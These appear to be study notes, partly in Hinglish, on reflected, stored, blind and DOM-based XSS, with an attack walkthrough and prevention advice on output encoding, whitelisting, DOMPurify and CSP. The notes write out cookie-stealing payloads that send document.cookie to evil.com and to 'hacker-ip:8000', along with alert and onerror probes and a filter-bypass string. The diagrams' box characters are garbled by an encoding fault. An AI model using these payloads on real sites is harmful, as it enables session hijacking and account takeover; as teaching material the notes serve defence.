# XSS
- XSS is a vulnerability that allows an attacker to inject malicious JavaScript code into a legitimate website. When a victim visits the site, the malicious code executes in their browser.

- **The Core Mechanism** It happens because the application takes **User Input** and outputs it to the web page without **Sanitizing** (cleaning) or **Encoding** it. The browser gets confused and thinks the input is executable code.

## Impact
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      XSS IMPACT SEVERITY                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚   CRITICAL IMPACTS                                           â”‚
â”‚  â”œâ”€â”€ Session Hijacking (Cookie Theft)                          â”‚
â”‚  â”œâ”€â”€ Account Takeover                                          â”‚
â”‚  â”œâ”€â”€ Credential Harvesting (Fake Login Forms)                  â”‚
â”‚  â””â”€â”€ Administrative Access Compromise                          â”‚
â”‚                                                                 â”‚
â”‚ HIGH IMPACTS                                                â”‚
â”‚  â”œâ”€â”€ Keylogging                                                â”‚
â”‚  â”œâ”€â”€ Phishing Attacks                                          â”‚
â”‚  â”œâ”€â”€ Malware Distribution                                      â”‚
â”‚  â””â”€â”€ Data Exfiltration                                         â”‚
â”‚                                                                 â”‚
â”‚  MEDIUM IMPACTS                                              â”‚
â”‚  â”œâ”€â”€ Website Defacement                                        â”‚
â”‚  â”œâ”€â”€ Cryptocurrency Mining                                     â”‚
â”‚  â”œâ”€â”€ Social Engineering                                        â”‚
â”‚  â””â”€â”€ Spam Distribution                                         â”‚
â”‚                                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
# **Types of XSS**
## 1. Reflected XSS:
- The script comes from the current HTTP request (e.g., URL parameters). It bounces off the server and executes immediately. Requires the attacker to send a link to the victim.
- 
- In Reflected XSS, the malicious script (virus) is **NOT stored** in the website's database. Instead, the malicious script travels inside the **URL (Link)** itself.

**Reflected XSS**
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ATTACKER   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 1: Creates malicious link
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Malicious Link:                                     â”‚
â”‚ https://bank.com/search?q=<script>                  â”‚
â”‚ document.location='http://evil.com/steal?cookie='  â”‚
â”‚ +document.cookie</script>                           â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 2: Sends link to victim (email/message)
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   VICTIM    â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 3: Victim clicks the link
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ VULNERABLE WEBSITE  â”‚
â”‚    (bank.com)       â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 4: Website reflects the script in response
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  VICTIM'S BROWSER   â”‚
â”‚  Executes script!   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 5: Cookie sent to attacker
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ATTACKER'S SERVER  â”‚
â”‚    (evil.com)       â”‚
â”‚  Receives cookie!   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

```
Attacker                     Victim                      Server
   â”‚                           â”‚                           â”‚
   â”‚  Send malicious link      â”‚                           â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                           â”‚
   â”‚                           â”‚                           â”‚
   â”‚                           â”‚  Click link               â”‚
   â”‚                           â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚
   â”‚                           â”‚                           â”‚
   â”‚                           â”‚  Page with reflected      â”‚
   â”‚                           â”‚  script                   â”‚
   â”‚                           â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚                           â”‚                           â”‚
   â”‚  Stolen data              â”‚  Script executes          â”‚
   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  in browser               â”‚
```
#### Attack Flow

**Step A: Discovery (The Self-Hack)**

- **Action:** The attacker tests a website (`reflected.com`) by typing `<script>alert(1)</script>` into the **Search Box**.
    
- **Observation:** The website displays the script back to the screen, and the alert pops up.
    
- **Conclusion:** The website is vulnerable because it reflects input without checking it. But right now, only the Attacker sees the alert.
    

**Step B: Weaponization 

- Since the script isn't saved on the server, the attacker must put the script into a format the victim can use.
    
- **The Weapon:** The attacker crafts a specific **URL**: `http://reflected.com/search?q=<script>steal_cookies()</script>`
```
reflected.com/search?q=<script>fetch('http://hacker-ip:8000/?cookie='+document.cookie)</script>
```
    
- _Note:_ The "Virus" is now embedded inside this link.
    

**Step C: Delivery (The Trap)**

- **Action:** The attacker sends this link to the Victim via Email, SMS, or WhatsApp.
    
- **Social Engineering:** The attacker uses a trick to make the victim click:
    
    > _"Click here to get a free iPhone!"_
    

**Step D: Execution (The Reflection)**

1. **Victim Clicks:** The victim trusts the domain (`reflected.com`) and clicks the link.
    
2. **Request Sent:** The victim's browser sends the request (containing the script in the URL) to the server. 
   reflected.com= goes to real server and server response back the victim
    
3. **Server Reflects:** The server receives the request, sees the search term, and immediately sends it back in the HTML response: _"Results for:
     `<script>`
    
4. **Browser Executes:** The victim's browser sees the script tags in the response and executes them.
      hacker-ip:8000= this request goes to attacker server/terminal 
    
5. **Damage Done:** The victim's cookies are sent to the attacker.


### Injection point / Vulnerable Parameters

==INPUT POINTS== where we can enter data ex:-

A. Search Boxes (`q`, `search`, `term`, `query`)
- **Normal URL:** `website.com/products?q=iphone`
    
- **Server Response:** _"Showing results for **iphone**"_
    
- **Why Vulnerable?** Kyunki search engine user ke keyword ko as-it-is screen par dikha deta hai.
    
- **Attack:** `?q=<script>alert(1)</script>`

B. Error Messages (`error`, `msg`, `message`)
- **Normal URL:** `website.com/login?error=IncorrectPassword`
    
- **Server Response:** Page ke upar laal rang mein likha aata hai: _"Error: **IncorrectPassword**"_
    
- **Why Vulnerable?** Developer URL se text uthakar seedha page par print kar raha hai.
    
- **Attack:** `?error=<script>alert('Hacked')</script>`

C. Page Navigation (`p`, `page`, `id`)
- **Normal URL:** `website.com/blog?p=5`
    
- **Server Response:** Kabhi-kabhi "Previous" ya "Next" button ke links mein ye number reflect hota hai.
    
- **Attack:** `?p=5"><script>alert(1)</script>`

D. Form Input Names (`name`, `email`)
- **Scenario:** Aapne form bhara aur submit kiya.
    
- **Response:** "Thank you **Ram**, we received your message."
    
- **Attack:** Agar aapne naam ki jagah script likh di, to wo reflect ho jayegi.


### **How to Identify?** 
Use a random alphanumeric string (called a "Canary" or "Probe"), like `XSS_TEST_123`. Submit it and check the page source code. If you see your string reflected exactly as you typed it inside the HTML tags, that parameter is likely vulnerable.

ex:-
```
<h1> You searched for: XSS_TEST_123 </h1>
```

## Blind XSS
Blind XSS is a type of stored XSS vulnerability where the malicious payload executes in a different context (often an admin panel or backend system) that the attacker cannot directly access or observe.

Need a DNS(Burp collaborator) to get response.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      BLIND XSS WORKFLOW                         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Attacker â”‚â”€â”€â”€â–¶â”‚ Target Form  â”‚â”€â”€â”€â–¶â”‚  Database   â”‚â”€â”€â”€â–¶â”‚  Admin   â”‚
â”‚          â”‚    â”‚ (Injection)  â”‚    â”‚  (Stored)   â”‚    â”‚  Panel   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”˜
     â–²                                                      â”‚
     â”‚                                                      â”‚
     â”‚            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                   â”‚
     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  Callback Server    â”‚â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                  â”‚  (Data Received)    â”‚    (Payload Executes)
                  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```
### Prevention of Reflected XSS
#### **1. Output Encoding (Context-Aware Encoding)**

- **Definition:** Converting special characters into their corresponding HTML entities so the browser interprets them as text, not code.
    
- **Mechanism:**
    
    - `<` becomes `&lt;`
        
    - `>` becomes `&gt;`

```
<script> 
RETURNS:-
&lt;script&gt;
```
- **Why it works:** It neutralizes the malicious tags. The script is displayed on the screen but never executes.
    
- **Where to apply:** On every piece of user data before it is rendered (displayed) in the HTML.

#### **2. Input Validation (Whitelisting)**

- **Definition:** Checking the user input against a strict rule of "Allowed Characters."
    
- **Strategy:** Use **Whitelisting** (Allow only good known characters) instead of Blacklisting (Blocking bad characters).
    
- **Example:** If a parameter is for a "Year", allow only digits `[0-9]`. Reject everything else.

#### **3.Content Security Policy (CSP)**

- **Definition:** An HTTP response header that lets site administrators declare approved sources of content that browsers are allowed to load.
    
- **Benefit:** It can mitigate the impact of XSS vulnerabilities. Even if an attacker injects a script, the CSP can stop the browser from executing it if it violates the policy (e.g., blocking inline scripts).



## Stored XSS

**Definition:** Stored XSS occurs when a malicious script is permanently stored on the target server (usually in a database). The victim retrieves the malicious script from the server when they visit the page.

**The Mechanism**

- **Input:** Attacker inputs a script into a storage area (Comments, Profiles, Logs).
```
    Nice blog! <script>steal_admin_cookies()</script>
```
- **Storage:** The application saves the input in the DB without sanitization.
    
- **Output:** The application serves the stored script to other users viewing that page.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ATTACKER   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 1: Posts malicious comment
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ VULNERABLE WEBSITE  â”‚
â”‚   (Comments Page)   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 2: Malicious script stored in database
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     DATABASE        â”‚
â”‚                     â”‚
â”‚ comment: "<script>  â”‚
â”‚ steal cookie        â”‚
â”‚ </script>"          â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 3: Victim visits comments page
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   VICTIM    â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 4: Website loads comment from database
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  VICTIM'S BROWSER   â”‚
â”‚  Executes script!   â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â”‚
       â”‚ Step 5: Cookie sent to attacker
       â”‚
       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ATTACKER'S SERVER  â”‚
â”‚  Receives cookie!   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

```
Attacker                     Server                      Victim
   â”‚                           â”‚                           â”‚
   â”‚  Submit malicious         â”‚                           â”‚
   â”‚  comment with script      â”‚                           â”‚
   â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚                           â”‚
   â”‚                           â”‚                           â”‚
   â”‚                           â”‚  Store in database        â”‚
   â”‚                           â”‚                           â”‚
   â”‚                           â”‚  Later, victim visits     â”‚
   â”‚                           â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚                           â”‚                           â”‚
   â”‚                           â”‚  Page with stored         â”‚
   â”‚                           â”‚  script                   â”‚
   â”‚                           â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚
   â”‚                           â”‚                           â”‚
   â”‚  Stolen data              â”‚                           â”‚
   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
```
#### **Storage (The Mistake)**

Server us comment ko leta hai aur bina check kiye apne **Database** mein save kar leta hai.

- Database entry: `ID: 101 | User: Hacker | Comment: <script>...</script>`

#### **Execution (The Blast)**

Ab **Victim** (e.g., Admin ya Normal User) us blog post ko padhne aata hai.

- Server database se comment uthata hai aur page par load karta hai.
    
- Browser script ko dekhta hai aur run kar deta hai.
    
- **Result:** Victim hack ho gaya, bina kisi link par click kiye.


## Prevention

- **Entry Gate (Input Validation):** Jab data database mein ja raha ho.
    
- **Exit Gate (Output Encoding):** Jab data database se nikal kar user ki screen par ja raha ho

### 1. Output Encoding (The Main Defense)

**Logic:** Bhale hi hacker ne database mein `<script>...` save karwa diya ho. Lekin jab hum us data
      ko **Fetch** karke page par dikhayenge, hum use **Text** mein badal denge.

- **Database mein:** `<script>alert(1)</script>`
    
- **Screen par dikhate waqt:** `&lt;script&gt;alert(1)&lt;/script&gt;`
    

**Browser Ka Reaction:** Browser dekhega: _"Oh, ye code nahi hai, ye to bas text hai."_ Aur wo script ko run karne ke bajaye screen par print kar dega.


### 2. Input Validation (The Filter)

**Whitelisting (Strict Rules):** Hum define karenge ki user kya likh sakta hai.

- **Username:** Sirf `A-Z` aur `0-9`. (Agar `<` aaya to reject).
    
- **Age:** Sirf Numbers.
    

**Lekin, ek problem hai:** Agar "Blog Comment" section hai, to wahan user `<` ya `>` use kar sakta hai (Maths explain karne ke liye). Wahan hum strict validation nahi laga sakte. Isliye **Output Encoding** zyada zaroori hai.


### **3. Sanitization Libraries (For Rich Text)**

Kabhi-kabhi hum chahte hain ki user **Bold** (`<b>`) ya **Italic** (`<i>`) use kar sake, lekin Script (`<script>`) nahi.

Aise mein hum **Sanitization Libraries** use karte hain (Jaise **DOMPurify**). Yeh libraries "Achhe Tags" (`<b>`, `<p>`) ko aane deti hain aur "Bure Tags" (`<script>`, `<object>`) ko nikaal kar fenk deti hain.


### **4. CSP (Content Security Policy)**

Yeh wahi **"Insurance Policy"** hai jo Reflected XSS mein thi. Agar galti se developer encoding bhool gaya, to CSP browser ko rok dega ki wo database se aayi hui script ko run na kare.



[^1]**1. Context-Aware Output Encoding (Primary Defense)**

- **What:** Converting special characters into HTML entities _at the moment the data is displayed_ to the user.
    
- **Why:** Even if the database contains a malicious script, encoding ensures the browser treats it as harmless text, not executable code.
    
- **Rule:** Encode data right before rendering it on the screen, not just when storing it.
    

**2. Input Validation (Secondary Defense)**

- **What:** Validating data against a strict **Whitelist** before saving it to the database.
    
- **Limit Length:** Restrict the number of characters (e.g., Username max 50 chars) to make it harder to inject long payloads.
    
- **Type Check:** Ensure age is an integer, email is a valid email format, etc.
    

**3. Sanitization (For Rich Text)**

- If the website allows users to post HTML (like bold text or images in comments), use a trusted library like **DOMPurify**.
    
- **Never** try to write your own "Blacklist" regex (like `replace('<script>', '')`) because hackers can easily bypass it (e.g., `<scr<script>ipt>`).
    

**4. Content Security Policy (CSP)**

- Implement headers to restrict the sources from which scripts can be loaded. This acts as a safety net if the above controls fail.

==**[^1]:**== 


## DOM-based XSS

DOM (Document Object Model) =Browser's representation of a webpage that JavaScript can modify.

==DOM=Browser's live, modifiable map of a webpage that JavaScript uses to read and change content dynamically.==

Think of a web page as a tree ğŸŒ³.
- HTML â†’ converted by the browser into objects
- Each tag becomes a node
- JavaScript can read and change these nodes

**Example**
**HTML:**
```HTML
<p id="msg">Hello</p>
```

**DOM (conceptually):**
```bash
document
 â””â”€â”€ p (id="msg")
```

**JavaScript:**
```js
document.getElementById("msg").innerText = "Hi";
```

==The browser updates the page without talking to the server.==

#### How Browser Creates DOM
**Step 1: You Write HTML**

```HTML
<!DOCTYPE html>
<html>
  <head>
    <title>My Page</title>
  </head>
  <body>
    <h1>Hello World</h1>
    <p>This is a paragraph</p>
  </body>
</html>
```

**Step 2: Browser Reads HTML**
```
Browser reads line by line:
- Found <html>
- Found <head>
- Found <title>
- Found <body>
- Found <h1>
- Found <p>
```

**Step 3: Browser Creates DOM Tree**

```
                    document
                        â”‚
                      <html>
                     /      \
                 <head>    <body>
                   â”‚        /    \
               <title>   <h1>    <p>
                   â”‚       â”‚       â”‚
              "My Page" "Hello  "This is
                        World"  a paragraph"
```

#### What JavaScript Can Do With DOM
1. Find Elements
2. Read Content
3. Change Content
4. Change Style
5. Add Elements
6. Remove Elements

**Example**
**Before JavaScript Runs:**
```html
<html>
<body>
  <h1 id="greeting">Hello</h1>
  <button onclick="changeText()">Click Me</button>
  
  <script>
    function changeText() {
      document.getElementById("greeting").innerHTML = "You clicked!";
    }
  </script>
</body>
</html>
```

User Sees:
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     Hello       â”‚
â”‚   [Click Me]    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```


**After Button Click**
```
JavaScript runs:
document.getElementById("greeting").innerHTML = "You clicked!";

DOM changes:
<h1 id="greeting">Hello</h1>
        â†“
<h1 id="greeting">You clicked!</h1>
```

**User Sees:**
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  You clicked!   â”‚
â”‚   [Click Me]    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Vulnerable code of DOM
```js
// User input goes directly into DOM
var userInput = location.hash.substring(1);
document.getElementById("output").innerHTML = userInput;
```

**Attack**
```
URL: site.com/page#<script>alert('Hacked!')</script>

DOM becomes:
<div id="output">
  <script>alert('Hacked!')</script>
</div>

Browser executes the script!
```

reasons:
1. JavaScript reads from URL (SOURCE)
2. JavaScript writes to DOM (SINK)
3. Browser sees new script in DOM
4. Browser executes the script
5. Attack successful!
   

#### SOURCE = Where attacker's input enters the application
#### SINK = Where attacker's input gets executed dangerously
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚     SOURCE      â”‚
â”‚   (User Input)  â”‚
â”‚                 â”‚
â”‚ â€¢ location.hash â”‚
â”‚ â€¢ location.href â”‚
â”‚ â€¢ document.URL  â”‚
â”‚ â€¢ document.referrer â”‚
â”‚ â€¢ window.name   â”‚
â”‚ â€¢ postMessage   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â”‚ Data flows through
         â”‚ JavaScript code
         â”‚
         â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      SINK       â”‚
â”‚ (Dangerous      â”‚
â”‚  Function)      â”‚
â”‚                 â”‚
â”‚ â€¢ innerHTML     â”‚
â”‚ â€¢ eval()        â”‚
â”‚ â€¢ document.writeâ”‚
â”‚ â€¢ location.href â”‚
â”‚ â€¢ setTimeout    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚
         â–¼
    ATTACK EXECUTED!
```

**example:**

Vulnerable Code:
```html
<html>
<body>
  <h1>Welcome Page</h1>
  <div id="greeting"></div>
  
  <script>
    // SOURCE: Getting data from URL hash
    var name = location.hash.substring(1);
    
    // SINK: Writing to innerHTML (dangerous!)
    document.getElementById('greeting').innerHTML = "Hello, " + name;
  </script>
</body>
</html>
```

**Normal Usage:**
```
URL: https://site.com/welcome#John

SOURCE: location.hash = "#John"
        name = "John"

SINK: innerHTML = "Hello, John"

Result: Page shows "Hello, John" âœ“
```

**Attack:**
```
URL: https://site.com/welcome#<img src=x onerror=alert('XSS')>

SOURCE: location.hash = "#<img src=x onerror=alert('XSS')>"
        name = "<img src=x onerror=alert('XSS')>"

SINK: innerHTML = "Hello, <img src=x onerror=alert('XSS')>"

Result: JavaScript executes! Alert pops up! âœ—
```

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ATTACKER                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                       â”‚
                       â”‚ Creates malicious URL:
                       â”‚ site.com/page#<script>alert(1)</script>
                       â”‚
                       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    VICTIM                                    â”‚
â”‚              Clicks the link                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                       â”‚
                       â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                 VICTIM'S BROWSER                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  1. Page loads from server                                   â”‚
â”‚     (Payload in # never sent to server!)                     â”‚
â”‚                                                              â”‚
â”‚  2. JavaScript runs:                                         â”‚
â”‚                                                              â”‚
â”‚     SOURCE                                                   â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚     â”‚ var name = location.hash.substring(1)                  â”‚
â”‚     â”‚ // name = "<script>alert(1)</script>"                  â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                       â”‚                                      â”‚
â”‚                       â–¼                                      â”‚
â”‚     SINK                                                     â”‚
â”‚     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚     â”‚ element.innerHTML = "Hello, " + name                   â”‚
â”‚     â”‚ // Writes script to page!                              â”‚
â”‚     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
